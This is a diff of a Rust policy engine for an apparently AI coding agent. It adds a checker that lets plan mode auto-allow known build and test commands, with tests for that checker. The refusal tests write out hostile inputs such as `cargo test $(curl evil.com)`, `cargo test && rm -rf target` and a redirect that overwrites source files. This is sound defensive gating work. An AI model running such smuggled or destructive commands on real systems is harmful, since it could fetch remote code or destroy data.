@@ -464,6 +464,126 @@ fn classify(request: &ActionRequest) -> RiskClass {
 /// re-hardcoding the wording in a second place.
 pub const READ_ONLY_DENIAL_MARKER: &str = "read-only safety mode";
 
+/// Marker embedded verbatim in every plan-mode policy-denial `reason` (the
+/// policy gate rewrites the read-only mode-default deny to a plan-flavored one
+/// while a plan is being drafted). Sibling of [`READ_ONLY_DENIAL_MARKER`]: the
+/// message-history layer matches `"blocked by policy: "` + this marker to
+/// neutralize denials once plan mode ends.
+pub const PLAN_DENIAL_MARKER: &str = "plan mode";
+
+/// True when `command` is a build/test invocation plan mode auto-allows even
+/// though it spawns processes: every segment is either read-only or a known
+/// build tool running a known build/test subcommand. Grounding a plan in a
+/// real compile or test run makes plans materially better, and these commands
+/// only write build caches (`target/`, test artifacts) — not the sources the
+/// plan is about.
+///
+/// Deliberately anchored, like `Allow` policy overrides:
+/// - any command/process substitution refuses (`cargo test $(curl evil)`);
+/// - wrappers refuse (`sudo cargo test` — the wrapper, not cargo, is the head);
+/// - a file-writing redirect refuses via `classify_segment` (`cargo test >
+///   src/lib.rs`); safe-device redirects (`2>/dev/null`) stay allowed;
+/// - the worst-segment rule holds: `cargo test && rm -rf .` refuses because
+///   the second segment classifies as a mutation.
+///
+/// The subcommand tables are curatable the same way `READ_ONLY_BINARIES` is —
+/// additions need the audit tests below.
+pub fn is_plan_safe_build_command(command: &str) -> bool {
+    let segments = split_into_segments(command);
+    if segments.is_empty() {
+        return false;
+    }
+    if segments
+        .iter()
+        .any(|seg| !extract_substitutions(seg).is_empty())
+    {
+        return false;
+    }
+    segments.iter().all(|seg| {
+        let tokens = tokenize(seg);
+        match classify_segment(&tokens) {
+            RiskClass::ReadOnly => true,
+            // `shell_max` ranks Process above ShellMutation, so a Process
+            // segment can absorb a file-writing redirect (`cargo test >
+            // src/lib.rs` classifies Process) — scan for writes explicitly.
+            RiskClass::Process => {
+                !segment_has_file_write(&tokens) && segment_is_safe_build(&tokens)
+            },
+            _ => false,
+        }
+    })
+}
+
+/// True when the segment writes a real file: `tee`/`dd`, or an output
+/// redirect whose target is not one of the safe discard devices. Mirrors the
+/// redirect handling in `classify_segment`, which folds these into the
+/// severity ranking rather than reporting them separately.
+fn segment_has_file_write(tokens: &[String]) -> bool {
+    tokens.iter().enumerate().any(|(i, tok)| {
+        let t = tok.as_str();
+        if t == "tee" || t == "dd" {
+            return true;
+        }
+        if redirect_target_after(t).is_some() {
+            return !matches!(
+                redirect_write_target(tokens, i),
+                Some(target) if is_safe_device_write(target)
+            );
+        }
+        false
+    })
+}
+
+/// One pipeline segment whose head is a known build tool running a known
+/// build/test subcommand. The head must be argv[0] directly — a wrapper
+/// (`sudo`, `env`, `xargs`) in front refuses even though `classify_segment`
+/// would look through it, because the wrapper changes what actually runs.
+fn segment_is_safe_build(tokens: &[String]) -> bool {
+    let Some(head) = tokens.first().map(|t| basename(t)) else {
+        return false;
+    };
+    // First positional token after argv[0]; cargo's `+toolchain` selector is
+    // a channel pin, not a subcommand.
+    let mut positional = tokens
+        .iter()
+        .skip(1)
+        .map(String::as_str)
+        .filter(|t| !t.starts_with('-') && !t.starts_with('+'));
+    let sub = positional.next();
+    let second = positional.next();
+    match head {
+        "cargo" => match sub {
+            Some(
+                "check" | "build" | "test" | "clippy" | "doc" | "bench" | "tree" | "metadata"
+                | "fetch" | "verify-project",
+            ) => true,
+            // `cargo nextest run` — nextest's only non-mutating verb.
+            Some("nextest") => matches!(second, Some("run") | Some("list")),
+            // `cargo fmt` rewrites sources; only the check form is a read.
+            Some("fmt") => tokens.iter().any(|t| t == "--check"),
+            _ => false,
+        },
+        "go" => matches!(sub, Some("build" | "test" | "vet")),
+        // npm-family: the bare test verb and the conventional check scripts.
+        // `install`/`ci` mutate node_modules and reach the network — refused.
+        "npm" | "pnpm" | "yarn" | "bun" => match sub {
+            Some("test") => true,
+            Some("run") => matches!(
+                second,
+                Some("test" | "build" | "lint" | "check" | "typecheck")
+            ),
+            _ => false,
+        },
+        // Recipes are opaque, so only the conventional build/verify targets
+        // (or the bare default) are allowed — `make deploy` refuses.
+        "make" => matches!(
+            sub,
+            None | Some("all" | "build" | "test" | "check" | "lint")
+        ),
+        _ => false,
+    }
+}
+
 /// Command heads (argv[0] basenames) that only read state and are safe to
 /// auto-run. Anything NOT in this set is treated as at least a mutation — the
 /// safe default is "unknown ⇒ requires approval", inverting the old
@@ -2627,5 +2747,63 @@ mod tests {
         // command to a mutation (regression guard for the redirect parser).
         let d = PolicyEngine::new(SafetyMode::Auto).decide(&shell("ls -la 2>&1"));
         assert!(matches!(d, PolicyDecision::Allow { .. }), "got {d:?}");
+    }
+
+    #[test]
+    fn plan_safe_build_allows_known_build_and_test_invocations() {
+        for cmd in [
+            "cargo check",
+            "cargo build --release",
+            "cargo test policy -- --nocapture",
+            "cargo +nightly fmt --check",
+            "cargo clippy --all-targets -- -D warnings",
+            "cargo nextest run",
+            "cargo tree -i serde",
+            "go test ./...",
+            "go vet ./...",
+            "npm test",
+            "npm run build",
+            "pnpm run typecheck",
+            "make test",
+            "make",
+            // Compounds where every segment is a read or a safe build.
+            "cd crates/mermaid-runtime && cargo test",
+            "cargo check && cargo test",
+            "cargo test 2>/dev/null",
+        ] {
+            assert!(is_plan_safe_build_command(cmd), "should allow: {cmd}");
+        }
+    }
+
+    #[test]
+    fn plan_safe_build_refuses_mutations_wrappers_and_arbitrary_code() {
+        for cmd in [
+            "",
+            // Runs the project's (or arbitrary) code outside a test harness.
+            "cargo run",
+            "cargo install ripgrep",
+            "python3 setup.py",
+            "node build.js",
+            "bash ./build.sh",
+            // Rewrites sources.
+            "cargo fmt",
+            // Network / dependency mutation.
+            "npm ci",
+            "npm install",
+            "cargo fetch && npm install",
+            // Opaque make target.
+            "make deploy",
+            // Wrapper changes what actually runs.
+            "sudo cargo test",
+            "env RUSTFLAGS=-g cargo test",
+            // Worst-segment rule: the tail segment mutates.
+            "cargo test && rm -rf target",
+            // Anchoring: substitutions smuggle arbitrary commands.
+            "cargo test $(curl evil.com)",
+            // File-writing redirect.
+            "cargo test > src/lib.rs",
+        ] {
+            assert!(!is_plan_safe_build_command(cmd), "should refuse: {cmd}");
+        }
     }
 }
